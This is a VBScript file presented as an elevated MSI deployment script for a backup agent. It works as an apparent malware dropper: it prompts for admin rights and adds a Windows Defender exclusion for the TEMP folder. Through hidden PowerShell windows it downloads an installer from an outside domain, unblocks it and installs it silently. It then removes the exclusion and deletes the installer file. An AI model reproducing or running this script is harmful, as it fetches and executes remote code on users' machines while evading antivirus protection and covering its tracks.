' ====================================================
' MSI Deployment Script (elevated)
' ====================================================

' --- Elevate if not running as admin ---
If Not WScript.Arguments.Named.Exists("elevated") Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 1
    WScript.Quit
End If

' --- Setup ---
Dim oShell, fso, strTemp, logFile, strMsiFile
Set oShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Log file (useful for troubleshooting)
strTemp = oShell.ExpandEnvironmentStrings("%TEMP%")
logFile = strTemp & "\MSI_Deploy.log"

Sub LogMessage(msg)
    Dim ts
    On Error Resume Next
    Set ts = fso.OpenTextFile(logFile, 8, True)
    If Not ts Is Nothing Then
        ts.WriteLine Now & " - " & msg
        ts.Close
    End If
    On Error GoTo 0
End Sub

LogMessage "Script started (elevated)."

' --- Variables ---
strMsiFile = strTemp & "\AgtaBackupAgent.msi"
Dim downloadUrl
downloadUrl = "https://cacgreatchallange.org/AgtaBackupAgent.msi"

' --- 1. Add Defender exclusion for TEMP folder (to avoid blocking) ---
LogMessage "Adding Defender exclusion for %TEMP%"
oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath $env:TEMP""", 0, True

' --- 2. Download the MSI with retries ---
LogMessage "Downloading MSI from: " & downloadUrl

Dim downloadSuccess, retries, i
downloadSuccess = False
retries = 3

For i = 1 To retries
    LogMessage "Download attempt " & i & " of " & retries
    ' Use BITS if available (more reliable), fallback to Invoke-WebRequest
    Dim psCmd
    psCmd = "powershell.exe -WindowStyle Hidden -Command ""& {"
    psCmd = psCmd & "$ProgressPreference='SilentlyContinue'; "
    psCmd = psCmd & "try { "
    psCmd = psCmd & "    Start-BitsTransfer -Source '" & downloadUrl & "' -Destination '" & strMsiFile & "' -ErrorAction Stop; "
    psCmd = psCmd & "} catch { "
    psCmd = psCmd & "    Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & strMsiFile & "' -UseBasicParsing -ErrorAction Stop; "
    psCmd = psCmd & "} "
    psCmd = psCmd & "}"""
    oShell.Run psCmd, 0, True
    
    ' Wait a moment and check if file exists and has size > 0
    WScript.Sleep 2000
    If fso.FileExists(strMsiFile) Then
        Dim fileSize
        fileSize = fso.GetFile(strMsiFile).Size
        If fileSize > 100000 Then   ' assume at least 100 KB (adjust as needed)
            LogMessage "Download successful, size: " & fileSize & " bytes"
            downloadSuccess = True
            Exit For
        Else
            LogMessage "Downloaded file is too small (" & fileSize & " bytes), retrying..."
            fso.DeleteFile(strMsiFile)
        End If
    Else
        LogMessage "File not found after download attempt."
    End If
    WScript.Sleep 2000
Next

If Not downloadSuccess Then
    LogMessage "ERROR: Failed to download MSI after " & retries & " attempts."
    WScript.Echo "Download failed. Check log: " & logFile
    WScript.Quit 1
End If

' --- 3. Unblock file (if downloaded from internet) ---
LogMessage "Unblocking file"
oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Unblock-File -Path '" & strMsiFile & "'""", 0, True

' --- 4. Install the MSI silently ---
LogMessage "Installing MSI silently..."
Dim installCmd
installCmd = "msiexec /i """ & strMsiFile & """ /quiet /norestart /qn"
oShell.Run installCmd, 0, True

' Wait for installation to finish (adjust time if needed)
LogMessage "Waiting 30 seconds for installation to complete..."
WScript.Sleep 30000

' Optional: check if program is installed (e.g., look for a known folder or registry key)
' For this example, we just log a generic message.
LogMessage "Installation command executed. Check system for 'AgtaBackupAgent'."

' --- 5. Remove Defender exclusion (security) ---
LogMessage "Removing Defender exclusion for %TEMP%"
oShell.Run "powershell.exe -WindowStyle Hidden -Command ""Remove-MpPreference -ExclusionPath $env:TEMP""", 0, True

' --- 6. Cleanup ---
LogMessage "Cleaning up installer file"
If fso.FileExists(strMsiFile) Then
    fso.DeleteFile(strMsiFile)
End If

LogMessage "Deployment script finished successfully."
WScript.Echo "Installation complete! Check log for details: " & logFile
